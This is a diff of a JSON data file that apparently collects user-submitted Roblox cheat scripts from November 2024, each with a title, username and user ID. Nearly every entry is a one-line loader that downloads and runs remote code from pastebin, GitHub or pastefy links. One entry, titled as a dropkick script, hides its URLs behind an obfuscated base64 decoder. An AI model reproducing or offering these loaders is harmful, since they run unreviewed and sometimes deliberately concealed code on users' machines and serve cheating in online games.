+      "Username": "thereal_12325"
+    },
+    "Script1232": {
+      "Date": "November 10 2024",
+      "Description": "auto chest blox fruit",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-autochest-11860\"))()",
+      "Script_Title": "auto chest ",
+      "User_ID": 7564263045,
+      "Username": "UUmu78910"
+    },
+    "Script1233": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "sound = Instance.new(\"Sound\",workspace)\nsound.Name = \"Noooooooooooooooot noooooooooooooooooooooooot\"\nsound.SoundId = \"rbxassetid://1839246711\"\nsound:Play()\nsound.Looped = true\nrepeat\nwait(0.01)\nuntil sound.IsLoaded == true\nwait(13)\nde = Instance.new(\"DistortionSoundEffect\",sound)\nde.Level = 0.8\nsky = Instance.new(\"Sky\",game:GetService(\"Lighting\"))\nsky.SkyboxBk = \"http://www.roblox.com/asset/?id=13324998653\"\nsky.SkyboxFt = \"http://www.roblox.com/asset/?id=13324998653\"\nsky.SkyboxLf = \"http://www.roblox.com/asset/?id=13324998653\"\nsky.SkyboxRt = \"http://www.roblox.com/asset/?id=13324998653\"\nsky.SkyboxUp = \"http://www.roblox.com/asset/?id=13324998653\"",
+      "Script_Title": "hack",
+      "User_ID": 4059448771,
+      "Username": "5555mmeee"
+    },
+    "Script1234": {
+      "Date": "November 10 2024",
+      "Description": "made for mage battlegrounds (credits to Zen)",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ZenHub103/Zen-Hub-/refs/heads/main/Mage%20Battleground\"))()",
+      "Script_Title": "Mage Battleground",
+      "User_ID": 6086663612,
+      "Username": "GioIsLikeDude"
+    },
+    "Script1235": {
+      "Date": "November 10 2024",
+      "Description": "For all Undertale monster mania games (some don't work)",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/nabhek/undertale-related-roblox-thing/main/test\"))()",
+      "Script_Title": "Utmm",
+      "User_ID": 6086663612,
+      "Username": "GioIsLikeDude"
+    },
+    "Script1236": {
+      "Date": "November 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "sus",
+      "User_ID": 7560651332,
+      "Username": "1ct91"
+    },
+    "Script1237": {
+      "Date": "November 10 2024",
+      "Description": "OP",
+      "Script": "loadstring(game:HttpGet(\"https://pastefy.app/Nt2LaL5b/raw\"))()",
+      "Script_Title": "Universe X",
+      "User_ID": 4393082564,
+      "Username": "emilcarevskiy96"
+    },
+    "Script1238": {
+      "Date": "November 10 2024",
+      "Description": "fly v3 script",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt\"))()",
+      "Script_Title": "fly v3",
+      "User_ID": 4334449740,
+      "Username": "Lol_999ggm"
+    },
+    "Script1239": {
+      "Date": "November 10 2024",
+      "Description": "dropkick (only work in tsb) ",
+      "Script": "local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nfunction xWqUpRZHlTcThCSQCPdZzxMXktbELWMUeyelpRoRUpxwEOJoNzLUVCFYkIKRp(data) m=string.sub(data, 0, 16) data=data:gsub(m,'')\n\ndata = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end\n\n\n \n\n\nloadstring(game:HttpGet(xWqUpRZHlTcThCSQCPdZzxMXktbELWMUeyelpRoRUpxwEOJoNzLUVCFYkIKRp('hbMIqbqBVdTqrrCnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZIbm56Z3p2')))()\n\nloadstring(game:HttpGet(xWqUpRZHlTcThCSQCPdZzxMXktbELWMUeyelpRoRUpxwEOJoNzLUVCFYkIKRp('OiakgjIsAylkWPkcaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VEOUQ5OHBk')))()",
+      "Script_Title": "kj 20-20-20 dropkick",
+      "User_ID": 7404910367,
+      "Username": "ronaldmcbart"
+    },
+    "Script1240": {
+      "Date": "November 10 2024",
+      "Description": "This Script Is insane very overpower (if dont work maybe its patched)",
+      "Script": "loadstring(game:HttpGet((\"https://raw.githubusercontent.com/max2007killer/auto-build-not-limit/main/buildaboatv2obs.txt\"),true))()",
+      "Script_Title": "Build A Boat AutoBui",
+      "User_ID": 3160125664,
+      "Username": "nanikore300"
+    },
+    "Script1241": {
+      "Date": "November 10 2024",
+      "Description": "This is will change you avatar by chosing you saved avatar roblox",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/RrGAQXi0\"))()",
+      "Script_Title": "Avatar Changer",
+      "User_ID": 3160125664,
+      "Username": "nanikore300"
+    },
+    "Script1242": {
+      "Date": "November 10 2024",
+      "Description": "something not work but still good",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/RrGAQXi0\"))()",
+      "Script_Title": "The Rake Remastered ",
+      "User_ID": 3160125664,
+      "Username": "nanikore300"
     }
   }
 }
